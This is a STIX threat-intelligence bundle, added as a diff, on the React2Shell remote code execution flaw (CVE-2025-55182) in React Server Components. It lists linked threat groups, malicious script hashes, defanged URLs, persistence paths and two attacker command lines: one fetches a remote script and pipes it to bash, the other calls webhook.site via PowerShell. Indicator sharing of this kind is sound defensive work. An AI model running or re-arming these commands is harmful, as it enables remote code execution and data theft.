@@ -1,0 +1,158 @@
+{
+  "type": "bundle",
+  "id": "bundle--9a26ea28-a8b2-48f7-bdd3-89d8d1c8c5cf",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "vulnerability",
+      "id": "vulnerability--b6e268fa-125a-4517-80ab-55e3d7b0918e",
+      "name": "React2Shell",
+      "description": "React2Shell is a critical vulnerability (CVE-2025-55182) in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0. It allows remote code execution via unsafe deserialization of user-supplied data using the React 'Flight' protocol. Attackers can send a single malicious HTTP request to gain control over server-side code execution without authentication. The flaw impacts frameworks such as Next.js and has been widely exploited.",
+      "created": "2025-12-03T00:00:00Z",
+      "external_references": [
+        {
+          "source_name": "CVE",
+          "external_id": "CVE-2025-55182",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-55182"
+        },
+        {
+          "source_name": "React",
+          "url": "https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components"
+        }
+      ]
+    },
+    {
+      "type": "intrusion-set",
+      "id": "intrusion-set--4eca8b12-cfca-48c2-9bad-7c23827815c7",
+      "name": "Earth Lumia",
+      "description": "Earth Lumia is a Chinese state-sponsored threat group observed exploiting the React2Shell vulnerability (CVE-2025-55182).",
+      "aliases": [],
+      "external_references": [
+        {
+          "source_name": "AWS",
+          "url": "https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/"
+        }
+      ]
+    },
+    {
+      "type": "intrusion-set",
+      "id": "intrusion-set--4eb3bf13-61b5-41c4-bc6b-c65f6fc89c0d",
+      "name": "Jackpot Panda",
+      "description": "Jackpot Panda is a Chinese state-sponsored threat group identified as exploiting the React2Shell vulnerability (CVE-2025-55182).",
+      "aliases": [],
+      "external_references": [
+        {
+          "source_name": "AWS",
+          "url": "https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/"
+        }
+      ]
+    },
+    {
+      "type": "intrusion-set",
+      "id": "intrusion-set--ee20d664-8abf-4597-b477-d0681222c3e6",
+      "name": "BRONZE SNOWDROP",
+      "description": "BRONZE SNOWDROP is a Chinese state-sponsored threat group observed deploying SNOWLIGHT and VShell malware during React2Shell exploitation.",
+      "aliases": [],
+      "external_references": [
+        {
+          "source_name": "Secureworks",
+          "url": "https://www.secureworks.com/research/threat-profiles/bronze-snowdrop"
+        }
+      ]
+    },
+    {
+      "type": "intrusion-set",
+      "id": "intrusion-set--46e711cf-d3c1-4152-91ad-46f441dea281",
+      "name": "Contagious Interview",
+      "description": "Contagious Interview is a campaign associated with North Korean state-sponsored threat actors, linked to EtherRAT deployments in React2Shell exploitation.",
+      "aliases": [],
+      "external_references": [
+        {
+          "source_name": "Sysdig",
+          "url": "https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks"
+        }
+      ]
+    },
+    {
+      "type": "file",
+      "id": "file--7f90b4df-fb37-4b2e-99a2-1517c3f8de5f",
+      "name": "gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh",
+      "hashes": {
+        "MD5": "011a62df99e52c8b73e259284ab1db47",
+        "SHA-1": "c3924fc5a90b6120c811eb716a25c168c72db0ba",
+        "SHA-256": "fb3a6bdf98d5010350c04b2712c2c8357e079dec2d2a848d0dc2def2bafcc984"
+      }
+    },
+    {
+      "type": "file",
+      "id": "file--b4da14e1-f3a6-4021-bdc0-dff73366b1f8",
+      "name": "tsd.sh",
+      "hashes": {
+        "SHA-1": "3ba7c58df9b6d21c04eaa822738291b60c65b7c8"
+      }
+    },
+    {
+      "type": "file",
+      "id": "file--1cb8352e-872a-4a73-9bae-4a9cd826b5e8",
+      "name": "init.sh",
+      "hashes": {
+        "MD5": "88af4a140ec63a15edc17888a08a76b2",
+        "SHA-1": "da33bda52e9360606102693d68316f4ec1be673e",
+        "SHA-256": "5a6fdcb5cf815ce065ee585a210c19d1c9efb45c293476554bf1516cc12a1bab"
+      }
+    },
+    {
+      "type": "file",
+      "id": "file--95546ee1-9e1a-4386-8e39-86aa5009124e",
+      "name": "b.sh",
+      "hashes": {
+        "SHA-1": "1e54a769e692a69d74f598e0b1fdb2949f242de3"
+      }
+    },
+    {
+      "type": "url",
+      "id": "url--54d51fb5-07e2-4b95-b947-8e6907f02674",
+      "value": "hxxp://194[.]38[.]11[.]3:1790/b.sh"
+    },
+    {
+      "type": "url",
+      "id": "url--4451f2d3-1146-4a26-9d6d-6db1f3247203",
+      "value": "hxxps://webhook[.]site/xxxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+    },
+    {
+      "type": "url",
+      "id": "url--02d93f44-932e-44c3-a816-7941b83b5a60",
+      "value": "hybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]com/agent"
+    },
+    {
+      "type": "file",
+      "id": "file--27614c2f-ff6e-4c53-a0cc-a41ea48d5963",
+      "name": "/usr/infju/system_os"
+    },
+    {
+      "type": "directory",
+      "id": "directory--cbec26ed-3661-4144-afe6-41f1c76d3820",
+      "path": "/etc/cron.hourly/"
+    },
+    {
+      "type": "directory",
+      "id": "directory--67c4d5ea-7827-48ba-8555-187144304b3f",
+      "path": "/usr/infju/"
+    },
+    {
+      "type": "directory",
+      "id": "directory--7dee5809-0b7c-46cb-8333-147a661aa008",
+      "path": "/var/log/"
+    },
+    {
+      "type": "process",
+      "id": "process--75054033-1aa5-44a2-8948-e8c7c4e4474c",
+      "command_line": "/bin/sh -c $(curl -sfL hxxp://194[.]38[.]11[.]3:1790/b.sh | bash | gzip -n | base64 -w0)"
+    },
+    {
+      "type": "process",
+      "id": "process--b148726f-52df-4d93-8d35-d96c1d454868",
+      "command_line": "C:\\Windows\\system32\\cmd.exe /d /s /c \"powershell -c \"curl hxxps://webhook[.]site/xxxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\"\""
+    }
+  ]
+}
